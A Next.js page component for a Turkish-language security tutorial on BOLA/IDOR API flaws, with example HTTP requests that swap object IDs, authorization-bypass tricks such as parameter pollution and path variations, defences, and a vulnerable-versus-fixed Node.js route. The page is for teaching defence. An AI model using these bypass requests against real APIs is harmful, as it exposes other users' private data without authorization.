"use client"

import { motion } from "framer-motion"
import Link from "next/link"
import { Server, ArrowRight, AlertTriangle } from "lucide-react"
import { TableOfContents } from "@/components/docs/table-of-contents"
import { CodeBlock } from "@/components/docs/code-block"
import { Callout } from "@/components/docs/callout"

const tocItems = [
  { id: "giris", title: "Giris", level: 2 },
  { id: "bola-nedir", title: "BOLA Nedir?", level: 2 },
  { id: "idor-nedir", title: "IDOR Nedir?", level: 2 },
  { id: "tespit", title: "Tespit Yontemleri", level: 2 },
  { id: "ornekler", title: "Zafiyet Ornekleri", level: 2 },
  { id: "bypass", title: "Bypass Teknikleri", level: 2 },
  { id: "savunma", title: "Savunma Yontemleri", level: 2 },
]

const fadeIn = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.5 },
}

const stagger = {
  animate: {
    transition: {
      staggerChildren: 0.1,
    },
  },
}

export default function BolaIdorPage() {
  return (
    <>
      <TableOfContents items={tocItems} />
      
      <motion.article
        initial="initial"
        animate="animate"
        variants={stagger}
        className="prose prose-invert max-w-none"
      >
        {/* Header */}
        <motion.div variants={fadeIn} className="mb-10">
          <div className="flex items-center gap-2 text-green-400 text-sm font-medium mb-4">
            <Server className="w-4 h-4" />
            <span>API Zafiyetleri</span>
          </div>
          <h1 id="giris" className="text-4xl font-bold text-foreground mb-4 scroll-mt-20">
            BOLA / IDOR
          </h1>
          <p className="text-lg text-muted-foreground leading-relaxed">
            Broken Object Level Authorization (BOLA) ve Insecure Direct Object Reference (IDOR), 
            API&apos;lerde en yaygin ve etkili zafiyetlerden biridir. OWASP API Top 10&apos;da 
            API1 olarak listelenir.
          </p>
        </motion.div>

        <motion.div variants={fadeIn}>
          <Callout type="info" title="OWASP API1:2023">
            BOLA, OWASP API Security Top 10&apos;da birinci sirada yer alir. 
            API&apos;lerin %40&apos;indan fazlasinda bu zafiyet bulunur.
          </Callout>
        </motion.div>

        {/* BOLA */}
        <motion.section variants={fadeIn} className="mt-10">
          <h2 id="bola-nedir" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">
            BOLA Nedir?
          </h2>
          <p className="text-muted-foreground mb-4">
            Broken Object Level Authorization (BOLA), bir kullanicinin yetkisi olmayan 
            nesnelere (objeler) erisebilmesi durumudur. API, kullanicinin istekte bulundugu 
            nesneye erisim yetkisini dogrulamamaktadir.
          </p>

          <div className="not-prose rounded-xl border border-border/50 bg-card p-5 my-6">
            <h4 className="font-semibold text-foreground mb-3">Ornek Senaryo</h4>
            <div className="space-y-3 text-sm">
              <div className="flex items-start gap-3">
                <span className="flex-shrink-0 w-6 h-6 rounded-full bg-green-500/20 text-green-400 flex items-center justify-center text-xs font-bold">1</span>
                <span className="text-muted-foreground">Kullanici A, <code className="text-primary">/api/orders/123</code> endpoint&apos;ine istek gonderir</span>
              </div>
              <div className="flex items-start gap-3">
                <span className="flex-shrink-0 w-6 h-6 rounded-full bg-green-500/20 text-green-400 flex items-center justify-center text-xs font-bold">2</span>
                <span className="text-muted-foreground">API, order 123&apos;un Kullanici A&apos;ya ait olup olmadigini kontrol etmez</span>
              </div>
              <div className="flex items-start gap-3">
                <span className="flex-shrink-0 w-6 h-6 rounded-full bg-green-500/20 text-green-400 flex items-center justify-center text-xs font-bold">3</span>
                <span className="text-muted-foreground">Kullanici A, ID&apos;yi 124&apos;e degistirerek baska kullanicinin verisine erisir</span>
              </div>
            </div>
          </div>
        </motion.section>

        {/* IDOR */}
        <motion.section variants={fadeIn} className="mt-10">
          <h2 id="idor-nedir" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">
            IDOR Nedir?
          </h2>
          <p className="text-muted-foreground mb-4">
            Insecure Direct Object Reference (IDOR), BOLA&apos;nin ozel bir turudur. 
            Kullanicinin kontrol ettigi bir parametre (ID, filename, vb.) uzerinden 
            yetkisiz kaynaklara dogrudan erisim saglanir.
          </p>

          <CodeBlock
            language="http"
            filename="Zaafiyetli API Istegi"
            code={`GET /api/users/1001/profile HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...

# Saldirgan ID'yi degistirerek baska kullanicinin profiline erisir
GET /api/users/1002/profile HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...`}
          />
        </motion.section>

        {/* Detection */}
        <motion.section variants={fadeIn} className="mt-10">
          <h2 id="tespit" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">
            Tespit Yontemleri
          </h2>

          <div className="not-prose space-y-3">
            {[
              {
                title: "ID Enumeration",
                desc: "URL veya body'deki ID degerlerini sistematik olarak degistirmek.",
              },
              {
                title: "Parameter Tampering",
                desc: "user_id, account_id, order_id gibi parametreleri manipule etmek.",
              },
              {
                title: "HTTP Method Switching",
                desc: "GET yerine PUT/DELETE kullanarak farkli islemler denemek.",
              },
              {
                title: "Path Traversal",
                desc: "/api/users/me yerine /api/users/[other_id] denemek.",
              },
              {
                title: "UUID Guessing",
                desc: "Predictable UUID pattern'leri varsa tahmin etmeye calismak.",
              },
            ].map((method) => (
              <div key={method.title} className="flex items-start gap-3 p-4 rounded-lg border border-border/50 bg-card">
                <div className="w-2 h-2 rounded-full bg-green-400 mt-2" />
                <div>
                  <h4 className="font-semibold text-foreground">{method.title}</h4>
                  <p className="text-sm text-muted-foreground">{method.desc}</p>
                </div>
              </div>
            ))}
          </div>
        </motion.section>

        {/* Examples */}
        <motion.section variants={fadeIn} className="mt-10">
          <h2 id="ornekler" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">
            Zafiyet Ornekleri
          </h2>

          <Callout type="warning" title="Yasal Uyari">
            Bu ornekler sadece egitim amaclidir. Izinsiz sistemlerde test yapmak yasa disidir.
          </Callout>

          <CodeBlock
            language="http"
            filename="Ornek 1: User Profile IDOR"
            code={`# Normal istek (kendi profilim)
GET /api/v1/users/5847/profile HTTP/1.1
Authorization: Bearer <my_token>

# Saldiri (baska kullanicinin profili)
GET /api/v1/users/5848/profile HTTP/1.1
Authorization: Bearer <my_token>

# Sonuc: 200 OK - Baska kullanicinin PII bilgileri`}
          />

          <CodeBlock
            language="http"
            filename="Ornek 2: Document Access IDOR"
            code={`# PDF indirme endpoint'i
GET /api/documents/download?file_id=DOC-2024-001 HTTP/1.1
Cookie: session=abc123

# Saldiri
GET /api/documents/download?file_id=DOC-2024-002 HTTP/1.1
Cookie: session=abc123

# Sonuc: Baska kullanicinin gizli dokumentine erisim`}
          />

          <CodeBlock
            language="http"
            filename="Ornek 3: Order Manipulation"
            code={`# Siparis detayi
GET /api/orders/ORD-789456 HTTP/1.1

# Siparis iptali (yetkisiz)
DELETE /api/orders/ORD-789457 HTTP/1.1

# Siparis guncelleme (yetkisiz)
PUT /api/orders/ORD-789457 HTTP/1.1
Content-Type: application/json

{"status": "cancelled", "refund": true}`}
          />

          <CodeBlock
            language="json"
            filename="Ornek 4: GraphQL IDOR"
            code={`# GraphQL Query ile IDOR
query {
  user(id: "other-user-uuid") {
    email
    phone
    address
    creditCards {
      lastFour
      expiryDate
    }
  }
}`}
          />
        </motion.section>

        {/* Bypass Techniques */}
        <motion.section variants={fadeIn} className="mt-10">
          <h2 id="bypass" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">
            Bypass Teknikleri
          </h2>

          <div className="not-prose space-y-4">
            <div className="rounded-lg border border-border/50 bg-card overflow-hidden">
              <div className="px-4 py-3 border-b border-border/50 bg-secondary/30">
                <h4 className="font-semibold text-foreground">ID Format Degistirme</h4>
              </div>
              <div className="p-4">
                <CodeBlock
                  language="text"
                  code={`# Integer ID bypass
/api/users/123 → /api/users/123.0
/api/users/123 → /api/users/123%00
/api/users/123 → /api/users/0x7B (hex)

# String ID bypass
/api/users/abc123 → /api/users/ABC123
/api/users/abc123 → /api/users/abc123%20`}
                />
              </div>
            </div>

            <div className="rounded-lg border border-border/50 bg-card overflow-hidden">
              <div className="px-4 py-3 border-b border-border/50 bg-secondary/30">
                <h4 className="font-semibold text-foreground">Parameter Pollution</h4>
              </div>
              <div className="p-4">
                <CodeBlock
                  language="http"
                  code={`# HPP (HTTP Parameter Pollution)
GET /api/profile?user_id=attacker&user_id=victim

# Array injection
GET /api/profile?user_id[]=attacker&user_id[]=victim

# JSON injection
POST /api/profile
{"user_id": "attacker", "user_id": "victim"}`}
                />
              </div>
            </div>

            <div className="rounded-lg border border-border/50 bg-card overflow-hidden">
              <div className="px-4 py-3 border-b border-border/50 bg-secondary/30">
                <h4 className="font-semibold text-foreground">Wrapped Object</h4>
              </div>
              <div className="p-4">
                <CodeBlock
                  language="json"
                  code={`# Nested object ile bypass
{
  "data": {
    "user": {
      "id": "victim-id"
    }
  }
}

# Wrapper degistirme
{"user": "victim-id"}
{"userId": "victim-id"}
{"user_id": "victim-id"}
{"userID": "victim-id"}`}
                />
              </div>
            </div>

            <div className="rounded-lg border border-border/50 bg-card overflow-hidden">
              <div className="px-4 py-3 border-b border-border/50 bg-secondary/30">
                <h4 className="font-semibold text-foreground">Endpoint Varyasyonlari</h4>
              </div>
              <div className="p-4">
                <CodeBlock
                  language="text"
                  code={`# API version bypass
/api/v2/users/123 → /api/v1/users/123
/api/v2/users/123 → /api/users/123

# Path bypass
/api/users/123 → /api/users/./123
/api/users/123 → /api/users/123/
/api/users/123 → /api/Users/123`}
                />
              </div>
            </div>
          </div>
        </motion.section>

        {/* Defense */}
        <motion.section variants={fadeIn} className="mt-10">
          <h2 id="savunma" className="text-2xl font-semibold text-foreground mb-4 scroll-mt-20">
            Savunma Yontemleri
          </h2>

          <div className="not-prose space-y-3 mb-6">
            {[
              {
                title: "Authorization Check",
                desc: "Her API isteginde kullanicinin ilgili kaynaga erisim yetkisini dogrulayin.",
              },
              {
                title: "Indirect References",
                desc: "Dogrudan ID yerine mapping table veya session-based referanslar kullanin.",
              },
              {
                title: "UUID/GUID Kullanimi",
                desc: "Tahmin edilebilir sequential ID'ler yerine random UUID kullanin.",
              },
              {
                title: "Access Control Lists",
                desc: "Kaynak bazli erisim kontrol listeleri (ACL) implemente edin.",
              },
              {
                title: "Logging & Monitoring",
                desc: "Anormal erisim pattern'lerini tespit icin logging yapin.",
              },
            ].map((defense) => (
              <div key={defense.title} className="flex items-start gap-3 p-4 rounded-lg border border-border/50 bg-card">
                <div className="w-2 h-2 rounded-full bg-green-400 mt-2" />
                <div>
                  <h4 className="font-semibold text-foreground">{defense.title}</h4>
                  <p className="text-sm text-muted-foreground">{defense.desc}</p>
                </div>
              </div>
            ))}
          </div>

          <CodeBlock
            language="javascript"
            filename="Guvenli Kod Ornegi (Node.js)"
            code={`// Zaafiyetli kod
app.get('/api/orders/:orderId', async (req, res) => {
  const order = await Order.findById(req.params.orderId);
  return res.json(order); // Yetki kontrolu YOK!
});

// Guvenli kod
app.get('/api/orders/:orderId', async (req, res) => {
  const order = await Order.findById(req.params.orderId);
  
  // Yetki kontrolu
  if (!order || order.userId !== req.user.id) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  return res.json(order);
});`}
          />
        </motion.section>

        {/* Navigation */}
        <motion.div variants={fadeIn} className="mt-10 flex items-center justify-between pt-6 border-t border-border/50 not-prose">
          <div />
          <Link
            href="/docs/api/broken-auth"
            className="flex items-center gap-2 text-primary hover:underline group"
          >
            Broken Authentication
            <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
          </Link>
        </motion.div>
      </motion.article>
    </>
  )
}
